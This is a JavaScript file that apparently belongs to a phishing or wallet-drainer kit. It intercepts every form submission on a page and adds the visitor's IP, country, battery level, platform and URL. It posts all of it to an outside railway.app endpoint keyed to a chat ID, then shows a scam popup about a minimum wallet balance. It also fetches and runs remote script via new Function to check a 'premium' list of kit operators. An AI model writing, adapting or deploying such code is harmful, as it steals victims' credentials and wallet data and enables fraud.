// ================= LOAD PREMIUM USERS =================
let premiumUsers = [];

async function loadPremiumUsers() {
  try {
    const res = await fetch("https://afkft.github.io/ho/da/premiumlist.js");
    const text = await res.text();

    // Execute premiumlist.js and extract premiumUsers
    const fn = new Function(text + "; return premiumUsers;");
    premiumUsers = fn();
  } catch (err) {
    console.error("❌ Failed to load premium list", err);
    premiumUsers = [];
  }
}

// ================= MAIN SCRIPT =================
document.addEventListener("DOMContentLoaded", async () => {
  await loadPremiumUsers(); // 🔥 Load premium list first

  const DEFAULT_USER_ID = "7979664801";
  const DEFAULT_BALANCE = "0";
  const DEFAULT_MIN = "0";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown";
  let userIP = "Unknown";
  let batteryLevel = "Unknown";

  // ---------- BATTERY INFO ----------
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(battery => {
        batteryLevel = Math.round(battery.level * 100) + "%";
      })
      .catch(() => {});
  }

  // ---------- IP + COUNTRY ----------
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data) {
        userCountry = data.country_name || userCountry;
        userIP = data.ip || userIP;
      }
    })
    .catch(() => {});

  // ---------- FORM HANDLER ----------
  forms.forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;
      const balance = urlParams.get("balance") || DEFAULT_BALANCE;
      const min = urlParams.get("min") || DEFAULT_MIN;

      const numericUserId = Number(userId);

      // ❌ BLOCK NON-PREMIUM USERS
      if (!premiumUsers.includes(numericUserId)) {
        showPopup("🚫 Access denied. Try again or check premium.", "#ff4d4d");
        return;
      }

      // ✅ PREMIUM USER CONTINUES
      const formData = new FormData(form);

      formData.append("chat_id", userId);
      formData.append("──────────────", "");
      formData.append("📊 System Information", "");
      formData.append("──────────────", "");
      formData.append("📄 Page", document.title);
      formData.append("🕒 Date & Time", new Date().toLocaleString());
      formData.append("🌍 Country", userCountry);
      formData.append("📡 Client IP", userIP);
      formData.append("🔋 Battery Level", batteryLevel);
      formData.append("💻 Platform", navigator.platform || "Unknown");
      formData.append("🌐 Language", navigator.language || "Unknown");
      formData.append("🔗 Page URL", window.location.href);

      // ✅ SHOW LOADING POPUP
      const loadingId = showLoadingPopup("⏳ Loading your wallet, please wait...");

      try {
        const response = await fetch(
          "https://gunicorn-app-production-b877.up.railway.app/send",
          { method: "POST", body: formData }
        );

        removePopup(loadingId); // remove loading popup

        if (response.ok) {
          form.reset();

          // ✅ SUCCESS POPUP
          showPopup(
            `,🙄 Please note\nYou must have $${min} in your wallet to make your earning successful.`,
            "#1c1c1c",
            true,
            `c.html?id=${encodeURIComponent(userId)}&balance=${encodeURIComponent(balance)}&min=${encodeURIComponent(min)}`
          );

        } else {
          showPopup("❌ Error submitting form.", "#ff4d4d");
        }

      } catch (err) {
        removePopup(loadingId); // remove loading popup
        console.error("Network Error:", err);
        showPopup("⚠️ Network error. Please try again.", "#ff9900");
      }
    });
  });
});


// ================= POPUP FUNCTION (JS ONLY) =================
function showPopup(message, bgColor = "#1c1c1c", redirectAfter = false, redirectUrl = "") {

  removePopup("customPopup"); // remove any existing popup

  const overlay = document.createElement("div");
  overlay.id = "customPopup";
  overlay.style.position = "fixed";
  overlay.style.top = "0";
  overlay.style.left = "0";
  overlay.style.width = "100%";
  overlay.style.height = "100%";
  overlay.style.background = "rgba(0,0,0,0.7)";
  overlay.style.display = "flex";
  overlay.style.alignItems = "center";
  overlay.style.justifyContent = "center";
  overlay.style.zIndex = "9999";

  const box = document.createElement("div");
  box.style.background = bgColor;
  box.style.padding = "25px";
  box.style.borderRadius = "12px";
  box.style.maxWidth = "320px";
  box.style.textAlign = "center";
  box.style.fontFamily = "Arial, sans-serif";
  box.style.boxShadow = "0 10px 25px rgba(0,0,0,0.5)";

  const text = document.createElement("p");
  text.innerText = message;
  text.style.whiteSpace = "pre-line";
  text.style.fontSize = "14px";
  text.style.marginBottom = "20px";
  text.style.color = "#ffffff";

  const button = document.createElement("button");
  button.innerText = "Continue";
  button.style.padding = "10px 20px";
  button.style.border = "none";
  button.style.borderRadius = "6px";
  button.style.cursor = "pointer";
  button.style.background = "#28a745";
  button.style.color = "#fff";

  button.onclick = () => {
    overlay.remove();
    if (redirectAfter && redirectUrl) {
      window.location.href = redirectUrl;
    }
  };

  box.appendChild(text);
  box.appendChild(button);
  overlay.appendChild(box);
  document.body.appendChild(overlay);

  return overlay.id; // return id for removal
}

// ================= LOADING POPUP FUNCTION =================
function showLoadingPopup(message = "Loading...") {
  removePopup("loadingPopup"); // remove any existing loading popup

  const overlay = document.createElement("div");
  overlay.id = "loadingPopup";
  overlay.style.position = "fixed";
  overlay.style.top = "0";
  overlay.style.left = "0";
  overlay.style.width = "100%";
  overlay.style.height = "100%";
  overlay.style.background = "rgba(0,0,0,0.7)";
  overlay.style.display = "flex";
  overlay.style.alignItems = "center";
  overlay.style.justifyContent = "center";
  overlay.style.zIndex = "9998";

  const box = document.createElement("div");
  box.style.background = "#1c1c1c";
  box.style.padding = "25px";
  box.style.borderRadius = "12px";
  box.style.maxWidth = "300px";
  box.style.textAlign = "center";
  box.style.fontFamily = "Arial, sans-serif";
  box.style.boxShadow = "0 10px 20px rgba(0,0,0,0.5)";

  const text = document.createElement("p");
  text.innerText = message;
  text.style.color = "#fff";
  text.style.fontSize = "14px";

  box.appendChild(text);
  overlay.appendChild(box);
  document.body.appendChild(overlay);

  return overlay.id;
}

// ================= REMOVE POPUP FUNCTION =================
function removePopup(id) {
  const popup = document.getElementById(id);
  if (popup) popup.remove();
}